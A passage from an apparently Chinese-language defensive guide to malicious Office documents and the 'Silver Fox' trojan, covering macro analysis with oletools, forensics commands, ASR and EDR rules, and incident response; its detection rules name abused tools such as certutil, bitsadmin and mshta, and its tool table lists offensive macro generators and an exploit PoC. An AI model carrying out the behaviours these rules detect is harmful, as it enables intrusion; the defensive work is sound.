# 使用olevba分析
olevba suspicious.docm
olevba -a suspicious.xlsm      # 显示所有分析
olevba -c suspicious.docm      # 只显示VBA代码
olevba --decode suspicious.docm  # 解码混淆字符串

# 查找嵌入的OLE对象
# 解压后查看 word/embeddings/ 目录
# 查看 oleObject1.bin 等文件

# === 2. 使用oletools套件 ===
# https://github.com/decalage2/oletools

# olevba: 提取和分析VBA宏
olevba --deobf suspicious.docm

# mraptor: 检测恶意宏
mraptor suspicious.docm

# oleid: 快速识别文档风险
oleid suspicious.docx

# oledump: 查看OLE流
oledump.py suspicious.doc

# === 3. 动态分析 ===
# 在隔离沙箱中打开文档
# 监控:
# - 进程创建 (ProcMon)
# - 网络连接 (Wireshark/tcpdump)
# - 注册表变更 (RegShot)
# - 文件系统变更
# - API调用 (API Monitor)

# Any.Run / Joe Sandbox / VMRay 等在线沙箱
```

### 6.2 银狐木马取证

```bash
# === 1. 内存分析 ===
# Dump可疑进程内存
procdump -ma <PID> process.dmp
# 使用Volatility分析
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win10x64 malfind
volatility -f memory.dmp --profile=Win10x64 cmdline
volatility -f memory.dmp --profile=Win10x64 netscan
volatility -f memory.dmp --profile=Win10x64 dlllist -p <PID>

# === 2. 磁盘取证 ===
# 查找银狐常用持久化位置
# 注册表
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
# 计划任务
schtasks /query /fo LIST /v | findstr /i "Silver Update Security"
# %APPDATA%目录下的异常可执行文件
dir %APPDATA%\*.exe /s /b
# %TEMP%目录下的脚本/可执行文件
dir %TEMP%\*.ps1 /s /b

# === 3. 网络取证 ===
# 分析DNS缓存
ipconfig /displaydns
# 分析netstat连接
netstat -anob
# 提取浏览器历史
# 分析防火墙日志
# 从流量抓包中找到C2域名/IP
```

---

## 7. 检测与防御方案

### 7.1 技术防御层

```powershell
# === 1. 禁用或限制宏 ===
# 组策略: 阻止宏在来自Internet的文件中运行
# User Configuration → Administrative Templates → Microsoft Office → Security Settings
#   → "Block macros from running in Office files from the Internet"

# 只允许数字签名宏执行
# 完全禁止VBA(在不需要宏的环境中)

# === 2. 禁用危险功能 ===
# DDE
# 注册表: HKLM\SOFTWARE\Microsoft\Office\XX.0\Word\Options
# DWORD: DontUpdateLinks = 1

# 公式编辑器
# 卸载EQNEDT32.EXE（已不再需要）

# OLE Packager
# 组策略: 禁用ActiveX和OLE对象激活

# === 3. ASR规则 (Attack Surface Reduction) ===
# Windows Defender ASR规则
Add-MpPreference -AttackSurfaceReductionRules_Ids `
    "d4f940ab-401b-4efc-aadc-ad5f3c50688a" ` # 阻止Office创建子进程
    "75668C1F-73B5-4CF0-BB93-3ECF5F5C9CC4" ` # 阻止Office注入代码
    "3B576869-A4EC-4529-8536-B80A7769E899" ` # 阻止Office创建可执行内容
    "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" ` # 阻止Win32 API调用自Office宏
    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" ` # 阻止可执行内容自邮件和Webmail
    -Enabled 1

# === 4. 文件类型关联保护 ===
# 限制mshta执行
# 组策略: 将.mshta/.hta关联到记事本

# === 5. 邮件安全网关 ===
# 剥离Office文档中的宏
# 剥离Office文档中的OLE对象
# 剥离Office文档中的DDE字段
# 将文档转换为PDF再投递
# 附件沙箱分析

# === 6. 使用受保护的视图(Protected View) ===
# 默认启用
# 对来源不可信的文件强制启动受保护的视图
```

### 7.2 EDR/HIPS 规则

```yaml
# 关键行为检测规则

# 规则1: Office进程创建子进程（高置信度告警）
detection:
  parent_process: [winword.exe, excel.exe, powerpnt.exe]
  child_process: [cmd.exe, powershell.exe, wscript.exe, cscript.exe,
                  mshta.exe, regsvr32.exe, rundll32.exe, certutil.exe,
                  bitsadmin.exe, wmic.exe, schtasks.exe]
  action: alert(high)

# 规则2: Office进程网络连接（下载Payload）
detection:
  parent_process: [winword.exe, excel.exe]
  network_connection: true
  destination: external_ip  # 非内网地址
  protocol: [HTTP, HTTPS]
  action: alert(medium)

# 规则3: Office进程写入可执行文件
detection:
  parent_process: [winword.exe, excel.exe]
  file_write:
    extension: [.exe, .dll, .ps1, .bat, .vbs, .js, .hta, .scr]
    path_not_in: [%TEMP%]  # 即使TEMP也需关注
  action: alert(high)

# 规则4: 从%APPDATA%或%TEMP%启动未签名可执行文件
detection:
  process_start:
    path_contains: [%APPDATA%, %TEMP%, %LOCALAPPDATA%]
    signed: false
    parent_not_in: [trusted_installers]
  action: alert(high)

# 规则5: 检测DLL劫持（签名白进程从非系统目录加载DLL）
detection:
  process: signed
  module_loaded: unsigned
  module_path_not_in: [System32, SysWOW64, Program Files]
  action: alert(medium)
```

### 7.3 用户安全意识

```bash
# === 培训核心要点 ===
1. 不启用来源不明文档的宏
2. 检查发件人邮箱地址（不仅是显示名称）
3. 对于要求"启用编辑"、"启用内容"的文档保持警惕
4. 需要输入密码/敏感信息时确认网站URL
5. 从官方渠道下载软件，不轻信搜索引擎第一条结果
6. 对微信/QQ群中的文件保持警觉
7. 文件扩展名显示设为"始终显示"
8. 发现可疑及时上报IT安全团队
```

---

## 8. 应急响应流程

    发现恶意Office文档攻击的应急响应:

    1. 确认 (15分钟)
       □ 确认文档来源（邮件/即时通讯/下载）
       □ 确认是否有用户打开并启用了宏
       □ 确认时间窗口

    2. 隔离 (30分钟)
       □ 断网隔离受影响主机
       □ 保留内存快照（不要重启、不要关机）
       □ 封禁已确认的C2域名/IP
       □ 通知可能受影响的用户

    3. 取证 (2小时)
       □ 内存dump (DumpIt/WinPMEM)
       □ 磁盘镜像 (FTK Imager)
       □ 收集事件日志 (wevtutil)
       □ 提取网络连接历史
       □ 分析恶意文档 (oletools)

    4. 分析 (4小时)
       □ 确定银狐/其他木马家族
       □ 提取C2地址和通信方式
       □ 分析窃取了哪些数据
       □ 追溯初始感染时间
       □ 确定影响范围（是否横向移动）

    5. 清除 (按分析结果)
       □ 终止恶意进程
       □ 删除持久化机制（计划任务/注册表/服务/WMI）
       □ 删除恶意文件（包括DLL劫持文件）
       □ 修复被篡改的配置

    6. 恢复
       □ 从干净备份恢复（或重装系统）
       □ 重置所有受影响账号密码
       □ 重置所有API密钥/Token
       □ 通知相关方（用户/监管）

    7. 加固
       □ 部署ASR规则
       □ 加强邮件网关过滤
       □ 用户安全意识再培训
       □ 更新检测规则（基于本次IOC）

---

## 9. 工具与资源汇总

| 类别     | 工具                  | 用途                        |
| -------- | --------------------- | --------------------------- |
| **分析** | oletools/olevba       | VBA 宏提取与去混淆          |
| **分析** | oledump               | OLE 流分析                  |
| **分析** | OfficeMalScanner      | 恶意 Office 文档扫描        |
| **分析** | ViperMonkey           | VBA 宏模拟执行              |
| **分析** | ProcMon/ProcExp       | 进程行为监控                |
| **检测** | Yara                  | 恶意文档模式匹配            |
| **检测** | ClamAV                | 开源反病毒引擎              |
| **沙箱** | Any.Run / Joe Sandbox | 在线恶意文档沙箱            |
| **沙箱** | CAPE Sandbox          | 开源恶意软件分析沙箱        |
| **利用** | CVE-2017-11882 POC    | 公式编辑器漏洞利用          |
| **利用** | Luckystrike           | 恶意宏文档生成框架          |
| **利用** | MacroPack             | 专业红队宏生成器            |
| **利用** | EvilClippy            | 修改 Office 文档属性        |
| **利用** | RemoteTemplateInject  | 模板注入工具                |
| **防御** | Microsoft ASR         | Windows Defender 攻击面减少 |
| **防御** | Sysmon                | 系统行为监控                |
| **情报** | VirusTotal            | 文件/URL 多引擎扫描         |
| **情报** | MalwareBazaar         | 恶意软件样本库              |
| **情报** | ThreatBook (微步)     | 中国本地化威胁情报          |

---

> **银狐法则**: 银狐的成功不在于技术有多先进，而在于它对中国用户习惯的精准把握——伪装微信/QQ/TIM、模仿 WPS 安装包、山寨搜狗输入法。技术防御之外，理解攻击者的社会工程逻辑才是根本。

> **文档攻击法则**: Office 文档可以执行代码——这个事实不会变。与其期待用户不点击，不如从技术上让恶意文档无法执行。ASR 规则 + 禁用宏 + 邮件网关剥离 \= 最有效的三道防线。
